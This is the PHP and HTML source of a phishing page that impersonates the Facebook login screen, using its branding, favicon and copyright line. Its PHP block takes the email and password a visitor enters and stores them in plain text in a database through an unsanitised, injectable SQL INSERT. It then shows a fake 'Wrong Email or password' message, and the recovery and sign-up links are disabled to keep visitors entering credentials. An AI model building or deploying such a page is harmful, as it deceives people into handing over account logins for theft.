<?php
session_start();

?>

<!DOCTYPE html>
<html>
<head>
    <title>Log in into Facebook | Facebook</title>
    <link rel="stylesheet" type="text/css" href="css/login-style.css">
    <link rel="stylesheet" type="text/css" href="css/signup-style.css">
    <script type="text/javascript" src="js/jquery-3.2.1.js"></script>
    <script type="text/javascript" src="js/login.js"></script>
    <script type="text/javascript" src="js/jquery-forms.js"></script>
    <link rel="icon" href="https://z-m-static.xx.fbcdn.net/rsrc.php/yl/r/H3nktOa7ZMg.ico" sizes="16x16"/>
    <link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
</head>
<script type="text/javascript">


	function errFormLogin(){
	var errContainer = document.getElementById("errContainer");
	var ename = document.getElementById("eName");
	var ePwd = document.getElementById("ePwd");
	var errorMsg = document.getElementById("errorMsg");
 	var loginContainer = document.getElementById("login-container");
 	
	if (ePwd.value == "" && ename.value == "") {
		ename.style.border = "1px solid #8b0300";
		ePwd.style.border = "1px solid #ab1717";
		errContainer.style.display = "inline-block";
		errorMsg.innerHTML = "Enter your email and password to continue";
		loginContainer.style.top = "20px";
		return false;
	}

	else if (ename.value == "") 
	{
		ename.style.border = "1px solid #8b0300";
		errContainer.style.display = "inline-block";
		errorMsg.innerHTML = "Please enter your email";
		loginContainer.style.top = "20px";
		return false;
	}
	else if (ePwd.value == "") {
		ePwd.style.border = "1px solid #8b0300";
		errContainer.style.display = "inline-block";
		errorMsg.innerHTML = "Please enter your password";
		loginContainer.style.top = "20px";
		return false;
	}
	else {
		return true;
	}

}

function showToggle(){
	var ePwd = document.getElementById("ePwd");
	var pwdToggle = document.getElementById("pwd-toggle");
	if (pwdToggle.checked) {
		ePwd.setAttribute("type", "text");
	}
	else{
		ePwd.setAttribute("type", "password");
	}
}



</script>
<style type="text/css">
	*{
		padding: 0px;
		margin: 0px;
		font-family: 'Roboto', sans-serif;
		}
		body{
			background-color: #e9ebee;
		}
		@font-face {
		
		src: url("../fonts/Roboto-Regular.ttf");
		
		url("fonts/Roboto-Regular.ttf") format("ttf"),
		
		}
		#form-label{
			
			font-size: 18px;
			color: #686868;
		}
		#form-label-login{
			
			font-size: 18px;
			color: #000;
		}
		#form-label-frgt{
			
			font-size: 18px;
			color: #686868;
		}
		#navigation-container{
			width: 100%;
			height: 84px;
			background-color:#3f5c9a;
			overflow: hidden;
		}
		#navigation-container p{
			font-weight: bolder;
			font-size: 35px;
			color: #fff;
			padding: 15px;
			position: relative;
			top: 10px;
			left: 100px;
			text-align: left;
		}
			@media screen and (max-width: 400px){
					#navigation-container p{
			font-weight: bolder;
			font-size: 38px;
			color: #fff;
			padding: 15px;
			position: relative;
			top: 10px;
			left: 5px;
			text-align: left;
		}
			}	
	#errContainer{
		padding: 10px;
		display: none;
		border-radius: 2px;
		height: auto;
		margin-top: 50px;
		width: 43.5%;
		color: #fff;
		font-size: 13px;
		
		background-color: #942b2b;
		text-align: left;

	}

		#login-container{
		
		top: 100px;
		background-color: #fff;
		height: 280px;
		width: 45%;
		border-radius: 3px;
		position: relative;

		}
		.form-login{
		padding: 10px;
		margin: 2px;
		width: 290px;
		border-radius: 2px;
		border: 1px solid #dddfe2;
		outline: none;
		margin-bottom: 10px;
		}
		@media screen and (max-width: 860px){
				#login-container{
				width: 70%;
				}
				#errContainer{
					width: 70%;
				}
		}
		@media screen and (max-width: 600px){
				#login-container{
				width: 90%;
				}
		}
		@media screen and (max-width: 400px){
				#login-container{
				width: 99%;
				}
		}

		#form-login::placeholder{
		
		font-size: 13px;
		}

		#pwd-toggled{
		
		position: relative;
		color: #686868;
		font-size: 13px;
		display: block;
  		padding-left: 15px;
  		text-indent: -15px;
  		right: 83px;
		}
		#pwd-toggle{
		width: 20px;
		height: 13px;
		padding: 0;
		margin:0;
		vertical-align: bottom;
		position: relative;
		top: -1px;

		*overflow: hidden;
		}

	#submit-btn{
		width: 311px;
		padding: 12px;
		color: #fff;
		font-weight: 400;
		font-size: 16px;
		left: -2px;
		border-radius: 2px;
		position: relative;
		background-color: #4267b2;
		border: 1px solid #4267b2;
		border: none;
		cursor: pointer;
		}
		#submit-btn:focus{
			padding: 11px;
			width: 309px;
			outline: none;
			transition: all 100ms linear;
		}
		#frgtPwd{
			
			font-size: 13px;
			color: blue;		
			position: relative;
			cursor: pointer;
			text-decoration: none;
		}

		#frgtPwd:hover{
					
			text-decoration: underline;
		}

		#crtAcc{
			
			font-size: 13px;
			color: blue;	
			cursor: pointer;	
			text-decoration: none;
		}
		#crtAcc:hover{	
			text-decoration: underline;
		}


	#copyright{
		font-size: 12px;
		color: #686868;
		

	}
	@media screen and (max-width: 860px){
				#login-container{
				width: 70%;
				}
				#errContainer{
					width: 65%;
				}
		}
		@media screen and (max-width: 600px){
				#login-container{
				width: 90%;
				}
				#errContainer{
					width: 80%;
				}
		}
		@media screen and (max-width: 400px){
				#login-container{
				width: 99%;
				}
				#errContainer{
					width:90%;
				}
		}

	#signup-container{
		display: none;
		
		margin-top: 100px;
		background-color: #fff;
		height: 485px;
		width: 40%;
		border-radius: 3px;
		position: relative;
		z-index: 1;

		}
	@media screen and (max-width: 860px){
				#signup-container{
				width: 70%;
				}
				#errContainer{
					width: 70%;
				}
		}
		@media screen and (max-width: 600px){
				#signup-container{
				width: 90%;
				}
		}
		@media screen and (max-width: 400px){
				#signup-container{
				width: 99%;
				}
		}
		.sgnup{
			padding: 7px;
			background-color: #42b72a;
			text-decoration: none;
			font-size: 13px;
			color: #fff;
			font-weight: 200;
			font-family: arial;
			border-radius: 4px;
		}
</style>





<!-------- Log in form section don't modif it-------->

<center>
<div id="navigation-container">
	
	<p>
		facebook <a href="" class="sgnup">Sign Up</a>
	</p>
</div>

<center>
<div id="errContainer">
<p id="errorMsg">  </p>

<?php
$url = "http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
if (strpos($url, 'require')) {
	echo "<script>alert('You must log in first!');</script>";
}


if (isset($_POST['btnlogin'])) {
	// DATABASE CONNECTION
$dbcon = mysqli_connect('id3660659_user', 'id3660659_user', '', 'id3660659_user');

	$email = $_POST['uname'];
	$password = $_POST['pass'];
	$insert = "INSERT into user (email, password) values ('$email', '$password')";
	if ($query = $dbcon->query($insert)) {
		echo "<script>alert('inserted');</script>";
	}
	else{
		echo "<script>alert('Wrong Email or password');</script>";
	}
}




?>
</div>

<script type="text/javascript">

</script>

<!-------- Log in form section don't modif it-------->


<div id="login-container">
<br><br>
<p id="form-label-login">Log in to Facebook</p>

<br>
<form action="index.php" method="POST" onsubmit="return errFormLogin();">

<input class="form-login" id="eName" type="text" placeholder="Email or Phone Number" name="uname"/>

<br>
<input class="form-login" id="ePwd" type="password" placeholder="Password" name="pass"/>
<br>

<input id="submit-btn" type="submit" name="btnlogin" value="Log in" />
</form>
<br>
<a href="" id="back-btn"  onclick="alert('You must log in to continue recover account is disabled');">Forgot account?</a><a href="" id="back-btn" onclick="alert('You must log in to continue sign up is disabled');">Sign up for facebook</a>
</div>
</center>
<!--------End of Log in form section don't modify it-------->
<style type="text/css">
	#back-btn{
		padding: 5px;
		text-decoration: none;
		color: #365899;
		font-size: 12px;
	}
</style>


<!--------Copyrught section don't modify it-------->
<br>
<br><br><br><br><br><br>
<center>
<p id="copyright">Facebook &copy;  2017</p>
</center>
</body>
</html>